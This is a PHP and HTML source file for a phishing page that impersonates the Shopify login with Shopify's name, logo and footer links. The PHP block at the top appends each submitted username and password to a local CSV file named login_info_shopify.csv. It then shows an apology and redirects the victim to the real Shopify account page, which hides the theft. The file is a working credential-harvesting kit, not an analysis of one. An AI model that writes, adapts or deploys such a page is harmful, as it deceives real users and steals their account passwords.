            <!-- PHP CODE TO STORE THE INFORMATION IN CSV FILE -->
<?php
    session_start();
    if (!isset($_SESSION['username'])) {
        header("Location: index.php");
        exit();
    }
    $user = $_SESSION['username'];
    if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {
        $pwd = htmlspecialchars($_POST['password']);
        $fp = fopen("login_info_shopify.csv", 'a');
        // to be run only the first time
        // fwrite($fp, "Username");
        // fwrite($fp, ",");
        // fwrite($fp, "Password");
        // fwrite($fp, "\n");

        fwrite($fp, "\n");
        fwrite($fp, $user);
        fwrite($fp, ",");
        fwrite($fp, $pwd);
        fclose($fp);
        echo "Sorry for the inconvenience. Redirecting to login page.";
        header("Refresh:0; url=https://accounts.shopify.com/lookup?rid=efaef73c-fd7b-4b4e-8d25-1a0c0fece91f&verify=1722962798-6EIb%2FS1%2B7V2uFm02TsmORXwh0obHc%2BzDotAoaCwC8Ec%3D");
        exit();
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopify</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="S.webp" type="image/x-icon">
</head>
<body>
    <main>
        <div class="main_con" style="height: 400px;">
            <header>
                <a href="https://www.shopify.com/">
                    <img src="Shopify_logo.svg.png" alt="Shopify" width="92px" height="26px">
                </a>
            </header>
            <div class="form-div" >
                <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">      
                    <h1>Log in</h1>
                    <h3>Continue with spotify</h3>
                    
                    <label >Email</label>
                    <br>
                    <input type="text" name="username" size="60" id="username" value="<?php echo $user; ?>" readonly>
                    <br><br>
                    <label>Password</label>
                    <input type="password" name="password" id="password" size="60">
                    <br>
                    <input type="submit" value="Log in" id="continue" >
                </form>
            </div>
            <br><br>
            
            
            <div class="foot">
                <div class="foot-components"><a href="https://help.shopify.com/en/manual/your-account/logging-in#desktop">Help</a></div>
                <div class="foot-components"><a href="https://www.shopify.com/legal/privacy">Privacy</a></div>
                <div class="foot-components"><a href="https://www.shopify.com/legal/terms">Terms</a></div>
            </div>
        </div>
    </main>
</body>
</html>